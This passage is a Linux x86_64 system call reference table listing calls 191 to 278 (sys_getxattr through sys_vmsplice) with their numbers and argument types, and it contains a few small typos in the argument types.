style=\"color:#4f4f4f;\">sys_getxattr</font> | <font style=\"color:#4f4f4f;\">191.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | |\n| <font style=\"color:#4f4f4f;\">192.</font> | <font style=\"color:#4f4f4f;\">sys_lgetxattr</font> | <font style=\"color:#4f4f4f;\">192.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | |\n| <font style=\"color:#4f4f4f;\">193.</font> | <font style=\"color:#4f4f4f;\">sys_fgetxattr</font> | <font style=\"color:#4f4f4f;\">193.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const har *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | |\n| <font style=\"color:#4f4f4f;\">194.</font> | <font style=\"color:#4f4f4f;\">sys_listxattr</font> | <font style=\"color:#4f4f4f;\">194.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | | |\n| <font style=\"color:#4f4f4f;\">195.</font> | <font style=\"color:#4f4f4f;\">sys_llistxattr</font> | <font style=\"color:#4f4f4f;\">195.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | | |\n| <font style=\"color:#4f4f4f;\">196.</font> | <font style=\"color:#4f4f4f;\">sys_flistxattr</font> | <font style=\"color:#4f4f4f;\">196.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | | | |\n| <font style=\"color:#4f4f4f;\">197.</font> | <font style=\"color:#4f4f4f;\">sys_removexattr</font> | <font style=\"color:#4f4f4f;\">197.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | | | | |\n| <font style=\"color:#4f4f4f;\">198.</font> | <font style=\"color:#4f4f4f;\">sys_lremovexattr</font> | <font style=\"color:#4f4f4f;\">198.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | | | | |\n| <font style=\"color:#4f4f4f;\">199.</font> | <font style=\"color:#4f4f4f;\">sys_fremovexattr</font> | <font style=\"color:#4f4f4f;\">199.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | | | | |\n| <font style=\"color:#4f4f4f;\">200.</font> | <font style=\"color:#4f4f4f;\">sys_tkill</font> | <font style=\"color:#4f4f4f;\">200.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">ing sig</font> | | | | |\n| <font style=\"color:#4f4f4f;\">201.</font> | <font style=\"color:#4f4f4f;\">sys_time</font> | <font style=\"color:#4f4f4f;\">201.</font> | <font style=\"color:#4f4f4f;\">time_t *tloc</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">202.</font> | <font style=\"color:#4f4f4f;\">sys_futex</font> | <font style=\"color:#4f4f4f;\">202.</font> | <font style=\"color:#4f4f4f;\">u32 *uaddr</font> | <font style=\"color:#4f4f4f;\">int op</font> | <font style=\"color:#4f4f4f;\">u32 val</font> | <font style=\"color:#4f4f4f;\">struct timespec *utime</font> | <font style=\"color:#4f4f4f;\">u32 *uaddr2</font> | <font style=\"color:#4f4f4f;\">u32 val3</font> |\n| <font style=\"color:#4f4f4f;\">203.</font> | <font style=\"color:#4f4f4f;\">sys_sched_setaffinity</font> | <font style=\"color:#4f4f4f;\">203.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int len</font> | <font style=\"color:#4f4f4f;\">unsigned long *user_mask_ptr</font> | | | |\n| <font style=\"color:#4f4f4f;\">204.</font> | <font style=\"color:#4f4f4f;\">sys_sched_getaffinity</font> | <font style=\"color:#4f4f4f;\">204.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int len</font> | <font style=\"color:#4f4f4f;\">unsigned long *user_mask_ptr</font> | | | |\n| <font style=\"color:#4f4f4f;\">205.</font> | <font style=\"color:#4f4f4f;\">sys_set_thread_area</font> | <font style=\"color:#4f4f4f;\">205.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED. Use arch_prctl</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">206.</font> | <font style=\"color:#4f4f4f;\">sys_io_setup</font> | <font style=\"color:#4f4f4f;\">206.</font> | <font style=\"color:#4f4f4f;\">unsigned nr_events</font> | <font style=\"color:#4f4f4f;\">aio_context_t *ctxp</font> | | | | |\n| <font style=\"color:#4f4f4f;\">207.</font> | <font style=\"color:#4f4f4f;\">sys_io_destroy</font> | <font style=\"color:#4f4f4f;\">207.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">208.</font> | <font style=\"color:#4f4f4f;\">sys_io_getevents</font> | <font style=\"color:#4f4f4f;\">208.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx_id</font> | <font style=\"color:#4f4f4f;\">long min_nr</font> | <font style=\"color:#4f4f4f;\">long nr</font> | <font style=\"color:#4f4f4f;\">struct io_event *events</font> | | |\n| <font style=\"color:#4f4f4f;\">209.</font> | <font style=\"color:#4f4f4f;\">sys_io_submit</font> | <font style=\"color:#4f4f4f;\">209.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx_id</font> | <font style=\"color:#4f4f4f;\">long nr</font> | <font style=\"color:#4f4f4f;\">struct iocb **iocbpp</font> | | | |\n| <font style=\"color:#4f4f4f;\">210.</font> | <font style=\"color:#4f4f4f;\">sys_io_cancel</font> | <font style=\"color:#4f4f4f;\">210.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx_id</font> | <font style=\"color:#4f4f4f;\">struct iocb *iocb</font> | <font style=\"color:#4f4f4f;\">struct io_event *result</font> | | | |\n| <font style=\"color:#4f4f4f;\">211.</font> | <font style=\"color:#4f4f4f;\">sys_get_thread_area</font> | <font style=\"color:#4f4f4f;\">211.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED. Use arch_prctl</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">212.</font> | <font style=\"color:#4f4f4f;\">sys_lookup_dcookie</font> | <font style=\"color:#4f4f4f;\">212.</font> | <font style=\"color:#4f4f4f;\">u64 cookie64</font> | <font style=\"color:#4f4f4f;\">long buf</font> | <font style=\"color:#4f4f4f;\">long len</font> | | | |\n| <font style=\"color:#4f4f4f;\">213.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_create</font> | <font style=\"color:#4f4f4f;\">213.</font> | <font style=\"color:#4f4f4f;\">int size</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">214.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_ctl_old</font> | <font style=\"color:#4f4f4f;\">214.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">215.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_wait_old</font> | <font style=\"color:#4f4f4f;\">215.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">216.</font> | <font style=\"color:#4f4f4f;\">sys_remap_file_pages</font> | <font style=\"color:#4f4f4f;\">216.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">unsigned long size</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | <font style=\"color:#4f4f4f;\">unsigned long pgoff</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | |\n| <font style=\"color:#4f4f4f;\">217.</font> | <font style=\"color:#4f4f4f;\">sys_getdents64</font> | <font style=\"color:#4f4f4f;\">217.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct linux_dirent64 *dirent</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | | | |\n| <font style=\"color:#4f4f4f;\">218.</font> | <font style=\"color:#4f4f4f;\">sys_set_tid_address</font> | <font style=\"color:#4f4f4f;\">218.</font> | <font style=\"color:#4f4f4f;\">int *tidptr</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">219.</font> | <font style=\"color:#4f4f4f;\">sys_restart_syscall</font> | <font style=\"color:#4f4f4f;\">219.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">220.</font> | <font style=\"color:#4f4f4f;\">sys_semtimedop</font> | <font style=\"color:#4f4f4f;\">220.</font> | <font style=\"color:#4f4f4f;\">int semid</font> | <font style=\"color:#4f4f4f;\">struct sembuf *tsops</font> | <font style=\"color:#4f4f4f;\">unsigned nsops</font> | <font style=\"color:#4f4f4f;\">const struct timespec *timeout</font> | | |\n| <font style=\"color:#4f4f4f;\">221.</font> | <font style=\"color:#4f4f4f;\">sys_fadvise64</font> | <font style=\"color:#4f4f4f;\">221.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int advice</font> | | |\n| <font style=\"color:#4f4f4f;\">222.</font> | <font style=\"color:#4f4f4f;\">sys_timer_create</font> | <font style=\"color:#4f4f4f;\">222.</font> | <font style=\"color:#4f4f4f;\">const clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct sigevent *timer_event_spec</font> | <font style=\"color:#4f4f4f;\">timer_t *created_timer_id</font> | | | |\n| <font style=\"color:#4f4f4f;\">223.</font> | <font style=\"color:#4f4f4f;\">sys_timer_settime</font> | <font style=\"color:#4f4f4f;\">223.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct itimerspec *new_setting</font> | <font style=\"color:#4f4f4f;\">struct itimerspec *old_setting</font> | | |\n| <font style=\"color:#4f4f4f;\">224.</font> | <font style=\"color:#4f4f4f;\">sys_timer_gettime</font> | <font style=\"color:#4f4f4f;\">224.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">struct itimerspec *setting</font> | | | | |\n| <font style=\"color:#4f4f4f;\">225.</font> | <font style=\"color:#4f4f4f;\">sys_timer_getoverrun</font> | <font style=\"color:#4f4f4f;\">225.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">226.</font> | <font style=\"color:#4f4f4f;\">sys_timer_delete</font> | <font style=\"color:#4f4f4f;\">226.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">227.</font> | <font style=\"color:#4f4f4f;\">sys_clock_settime</font> | <font style=\"color:#4f4f4f;\">227.</font> | <font style=\"color:#4f4f4f;\">const clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">const struct timespec *tp</font> | | | | |\n| <font style=\"color:#4f4f4f;\">228.</font> | <font style=\"color:#4f4f4f;\">sys_clock_gettime</font> | <font style=\"color:#4f4f4f;\">228.</font> | <font style=\"color:#4f4f4f;\">const clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct timespec *tp</font> | | | | |\n| <font style=\"color:#4f4f4f;\">229.</font> | <font style=\"color:#4f4f4f;\">sys_clock_getres</font> | <font style=\"color:#4f4f4f;\">229.</font> | <font style=\"color:#4f4f4f;\">const clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct timespec *tp</font> | | | | |\n| <font style=\"color:#4f4f4f;\">230.</font> | <font style=\"color:#4f4f4f;\">sys_clock_nanosleep</font> | <font style=\"color:#4f4f4f;\">230.</font> | <font style=\"color:#4f4f4f;\">const clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct timespec *rqtp</font> | <font style=\"color:#4f4f4f;\">struct timespec *rmtp</font> | | |\n| <font style=\"color:#4f4f4f;\">231.</font> | <font style=\"color:#4f4f4f;\">sys_exit_group</font> | <font style=\"color:#4f4f4f;\">231.</font> | <font style=\"color:#4f4f4f;\">int error_code</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">232.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_wait</font> | <font style=\"color:#4f4f4f;\">232.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *events</font> | <font style=\"color:#4f4f4f;\">int maxevents</font> | <font style=\"color:#4f4f4f;\">int timeout</font> | | |\n| <font style=\"color:#4f4f4f;\">233.</font> | <font style=\"color:#4f4f4f;\">sys_epoll_ctl</font> | <font style=\"color:#4f4f4f;\">233.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">int op</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *event</font> | | |\n| <font style=\"color:#4f4f4f;\">234.</font> | <font style=\"color:#4f4f4f;\">sys_tgkill</font> | <font style=\"color:#4f4f4f;\">234.</font> | <font style=\"color:#4f4f4f;\">pid_t tgid</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | | | |\n| <font style=\"color:#4f4f4f;\">235.</font> | <font style=\"color:#4f4f4f;\">sys_utimes</font> | <font style=\"color:#4f4f4f;\">235.</font> | <font style=\"color:#4f4f4f;\">char *filename</font> | <font style=\"color:#4f4f4f;\">struct timeval *utimes</font> | | | | |\n| <font style=\"color:#4f4f4f;\">236.</font> | <font style=\"color:#4f4f4f;\">sys_vserver</font> | <font style=\"color:#4f4f4f;\">236.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">237.</font> | <font style=\"color:#4f4f4f;\">sys_mbind</font> | <font style=\"color:#4f4f4f;\">237.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">unsigned long len</font> | <font style=\"color:#4f4f4f;\">unsigned long mode</font> | <font style=\"color:#4f4f4f;\">unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> |\n| <font style=\"color:#4f4f4f;\">238.</font> | <font style=\"color:#4f4f4f;\">sys_set_mempolicy</font> | <font style=\"color:#4f4f4f;\">238.</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | | | |\n| <font style=\"color:#4f4f4f;\">239.</font> | <font style=\"color:#4f4f4f;\">sys_get_mempolicy</font> | <font style=\"color:#4f4f4f;\">239.</font> | <font style=\"color:#4f4f4f;\">int *policy</font> | <font style=\"color:#4f4f4f;\">unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | |\n| <font style=\"color:#4f4f4f;\">240.</font> | <font style=\"color:#4f4f4f;\">sys_mq_open</font> | <font style=\"color:#4f4f4f;\">240.</font> | <font style=\"color:#4f4f4f;\">const char *u_name</font> | <font style=\"color:#4f4f4f;\">int oflag</font> | <font style=\"color:#4f4f4f;\">mode_t mode</font> | <font style=\"color:#4f4f4f;\">struct mq_attr *u_attr</font> | | |\n| <font style=\"color:#4f4f4f;\">241.</font> | <font style=\"color:#4f4f4f;\">sys_mq_unlink</font> | <font style=\"color:#4f4f4f;\">241.</font> | <font style=\"color:#4f4f4f;\">const char *u_name</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">242.</font> | <font style=\"color:#4f4f4f;\">sys_mq_timedsend</font> | <font style=\"color:#4f4f4f;\">242.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const char *u_msg_ptr</font> | <font style=\"color:#4f4f4f;\">size_t msg_len</font> | <font style=\"color:#4f4f4f;\">unsigned int msg_prio</font> | <font style=\"color:#4f4f4f;\">const stuct timespec *u_abs_timeout</font> | |\n| <font style=\"color:#4f4f4f;\">243.</font> | <font style=\"color:#4f4f4f;\">sys_mq_timedreceive</font> | <font style=\"color:#4f4f4f;\">243.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">char *u_msg_ptr</font> | <font style=\"color:#4f4f4f;\">size_t msg_len</font> | <font style=\"color:#4f4f4f;\">unsigned int *u_msg_prio</font> | <font style=\"color:#4f4f4f;\">const struct timespec *u_abs_timeout</font> | |\n| <font style=\"color:#4f4f4f;\">244.</font> | <font style=\"color:#4f4f4f;\">sys_mq_notify</font> | <font style=\"color:#4f4f4f;\">244.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const struct sigevent *u_notification</font> | | | | |\n| <font style=\"color:#4f4f4f;\">245.</font> | <font style=\"color:#4f4f4f;\">sys_mq_getsetattr</font> | <font style=\"color:#4f4f4f;\">245.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const struct mq_attr *u_mqstat</font> | <font style=\"color:#4f4f4f;\">struct mq_attr *u_omqstat</font> | | | |\n| <font style=\"color:#4f4f4f;\">246.</font> | <font style=\"color:#4f4f4f;\">sys_kexec_load</font> | <font style=\"color:#4f4f4f;\">246.</font> | <font style=\"color:#4f4f4f;\">unsigned long entry</font> | <font style=\"color:#4f4f4f;\">unsigned long nr_segments</font> | <font style=\"color:#4f4f4f;\">struct kexec_segment *segments</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | | |\n| <font style=\"color:#4f4f4f;\">247.</font> | <font style=\"color:#4f4f4f;\">sys_waitid</font> | <font style=\"color:#4f4f4f;\">247.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">pid_t upid</font> | <font style=\"color:#4f4f4f;\">struct siginfo *infop</font> | <font style=\"color:#4f4f4f;\">int options</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | |\n| <font style=\"color:#4f4f4f;\">248.</font> | <font style=\"color:#4f4f4f;\">sys_add_key</font> | <font style=\"color:#4f4f4f;\">248.</font> | <font style=\"color:#4f4f4f;\">const char *_type</font> | <font style=\"color:#4f4f4f;\">const char *_description</font> | <font style=\"color:#4f4f4f;\">const void *_payload</font> | <font style=\"color:#4f4f4f;\">size_t plen</font> | | |\n| <font style=\"color:#4f4f4f;\">249.</font> | <font style=\"color:#4f4f4f;\">sys_request_key</font> | <font style=\"color:#4f4f4f;\">249.</font> | <font style=\"color:#4f4f4f;\">const char *_type</font> | <font style=\"color:#4f4f4f;\">const char *_description</font> | <font style=\"color:#4f4f4f;\">const char *_callout_info</font> | <font style=\"color:#4f4f4f;\">key_serial_t destringid</font> | | |\n| <font style=\"color:#4f4f4f;\">250.</font> | <font style=\"color:#4f4f4f;\">sys_keyctl</font> | <font style=\"color:#4f4f4f;\">250.</font> | <font style=\"color:#4f4f4f;\">int option</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | <font style=\"color:#4f4f4f;\">unsigned long arg3</font> | <font style=\"color:#4f4f4f;\">unsigned long arg4</font> | <font style=\"color:#4f4f4f;\">unsigned long arg5</font> | |\n| <font style=\"color:#4f4f4f;\">251.</font> | <font style=\"color:#4f4f4f;\">sys_ioprio_set</font> | <font style=\"color:#4f4f4f;\">251.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">int ioprio</font> | | | |\n| <font style=\"color:#4f4f4f;\">252.</font> | <font style=\"color:#4f4f4f;\">sys_ioprio_get</font> | <font style=\"color:#4f4f4f;\">252.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | | | | |\n| <font style=\"color:#4f4f4f;\">253.</font> | <font style=\"color:#4f4f4f;\">sys_inotify_init</font> | <font style=\"color:#4f4f4f;\">253.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">254.</font> | <font style=\"color:#4f4f4f;\">sys_inotify_add_watch</font> | <font style=\"color:#4f4f4f;\">254.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">u32 mask</font> | | | |\n| <font style=\"color:#4f4f4f;\">255.</font> | <font style=\"color:#4f4f4f;\">sys_inotify_rm_watch</font> | <font style=\"color:#4f4f4f;\">255.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">__s32 wd</font> | | | | |\n| <font style=\"color:#4f4f4f;\">256.</font> | <font style=\"color:#4f4f4f;\">sys_migrate_pages</font> | <font style=\"color:#4f4f4f;\">256.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">const unsigned long *old_nodes</font> | <font style=\"color:#4f4f4f;\">const unsigned long *new_nodes</font> | | |\n| <font style=\"color:#4f4f4f;\">257.</font> | <font style=\"color:#4f4f4f;\">sys_openat</font> | <font style=\"color:#4f4f4f;\">257.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | |\n| <font style=\"color:#4f4f4f;\">258.</font> | <font style=\"color:#4f4f4f;\">sys_mkdirat</font> | <font style=\"color:#4f4f4f;\">258.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | |\n| <font style=\"color:#4f4f4f;\">259.</font> | <font style=\"color:#4f4f4f;\">sys_mknodat</font> | <font style=\"color:#4f4f4f;\">259.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | | |\n| <font style=\"color:#4f4f4f;\">260.</font> | <font style=\"color:#4f4f4f;\">sys_fchownat</font> | <font style=\"color:#4f4f4f;\">260.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">gid_t group</font> | <font style=\"color:#4f4f4f;\">int flag</font> | |\n| <font style=\"color:#4f4f4f;\">261.</font> | <font style=\"color:#4f4f4f;\">sys_futimesat</font> | <font style=\"color:#4f4f4f;\">261.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct timeval *utimes</font> | | | |\n| <font style=\"color:#4f4f4f;\">262.</font> | <font style=\"color:#4f4f4f;\">sys_newfstatat</font> | <font style=\"color:#4f4f4f;\">262.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat *statbuf</font> | <font style=\"color:#4f4f4f;\">int flag</font> | | |\n| <font style=\"color:#4f4f4f;\">263.</font> | <font style=\"color:#4f4f4f;\">sys_unlinkat</font> | <font style=\"color:#4f4f4f;\">263.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">int flag</font> | | | |\n| <font style=\"color:#4f4f4f;\">264.</font> | <font style=\"color:#4f4f4f;\">sys_renameat</font> | <font style=\"color:#4f4f4f;\">264.</font> | <font style=\"color:#4f4f4f;\">int oldfd</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">int newfd</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | | |\n| <font style=\"color:#4f4f4f;\">265.</font> | <font style=\"color:#4f4f4f;\">sys_linkat</font> | <font style=\"color:#4f4f4f;\">265.</font> | <font style=\"color:#4f4f4f;\">int oldfd</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">int newfd</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | <font style=\"color:#4f4f4f;\">int flags</font> | |\n| <font style=\"color:#4f4f4f;\">266.</font> | <font style=\"color:#4f4f4f;\">sys_symlinkat</font> | <font style=\"color:#4f4f4f;\">266.</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">int newfd</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | | | |\n| <font style=\"color:#4f4f4f;\">267.</font> | <font style=\"color:#4f4f4f;\">sys_readlinkat</font> | <font style=\"color:#4f4f4f;\">267.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int bufsiz</font> | | |\n| <font style=\"color:#4f4f4f;\">268.</font> | <font style=\"color:#4f4f4f;\">sys_fchmodat</font> | <font style=\"color:#4f4f4f;\">268.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">mode_t mode</font> | | | |\n| <font style=\"color:#4f4f4f;\">269.</font> | <font style=\"color:#4f4f4f;\">sys_faccessat</font> | <font style=\"color:#4f4f4f;\">269.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | |\n| <font style=\"color:#4f4f4f;\">270.</font> | <font style=\"color:#4f4f4f;\">sys_pselect6</font> | <font style=\"color:#4f4f4f;\">270.</font> | <font style=\"color:#4f4f4f;\">int n</font> | <font style=\"color:#4f4f4f;\">fd_set *inp</font> | <font style=\"color:#4f4f4f;\">fd_set *outp</font> | <font style=\"color:#4f4f4f;\">fd_set *exp</font> | <font style=\"color:#4f4f4f;\">struct timespec *tsp</font> | <font style=\"color:#4f4f4f;\">void *sig</font> |\n| <font style=\"color:#4f4f4f;\">271.</font> | <font style=\"color:#4f4f4f;\">sys_ppoll</font> | <font style=\"color:#4f4f4f;\">271.</font> | <font style=\"color:#4f4f4f;\">struct pollfd *ufds</font> | <font style=\"color:#4f4f4f;\">unsigned int nfds</font> | <font style=\"color:#4f4f4f;\">struct timespec *tsp</font> | <font style=\"color:#4f4f4f;\">const sigset_t *sigmask</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | |\n| <font style=\"color:#4f4f4f;\">272.</font> | <font style=\"color:#4f4f4f;\">sys_unshare</font> | <font style=\"color:#4f4f4f;\">272.</font> | <font style=\"color:#4f4f4f;\">unsigned long unshare_flags</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">273.</font> | <font style=\"color:#4f4f4f;\">sys_set_robust_list</font> | <font style=\"color:#4f4f4f;\">273.</font> | <font style=\"color:#4f4f4f;\">struct robust_list_head *head</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">274.</font> | <font style=\"color:#4f4f4f;\">sys_get_robust_list</font> | <font style=\"color:#4f4f4f;\">274.</font> | <font style=\"color:#4f4f4f;\">int pid</font> | <font style=\"color:#4f4f4f;\">struct robust_list_head **head_ptr</font> | <font style=\"color:#4f4f4f;\">size_t *len_ptr</font> | | | |\n| <font style=\"color:#4f4f4f;\">275.</font> | <font style=\"color:#4f4f4f;\">sys_splice</font> | <font style=\"color:#4f4f4f;\">275.</font> | <font style=\"color:#4f4f4f;\">int fd_in</font> | <font style=\"color:#4f4f4f;\">loff_t *off_in</font> | <font style=\"color:#4f4f4f;\">int fd_out</font> | <font style=\"color:#4f4f4f;\">loff_t *off_out</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> |\n| <font style=\"color:#4f4f4f;\">276.</font> | <font style=\"color:#4f4f4f;\">sys_tee</font> | <font style=\"color:#4f4f4f;\">276.</font> | <font style=\"color:#4f4f4f;\">int fdin</font> | <font style=\"color:#4f4f4f;\">int fdout</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | | |\n| <font style=\"color:#4f4f4f;\">277.</font> | <font style=\"color:#4f4f4f;\">sys_sync_file_range</font> | <font style=\"color:#4f4f4f;\">277.</font> | <font style=\"color:#4f4f4f;\">long fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">loff_t bytes</font> | <font style=\"color:#4f4f4f;\">long flags</font> | | |\n| <font style=\"color:#4f4f4f;\">278.</font> | <font style=\"color:#4f4f4f;\">sys_vmsplice</font> | <font style=\"color:#4f4f4f;\">278.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *iov</font> 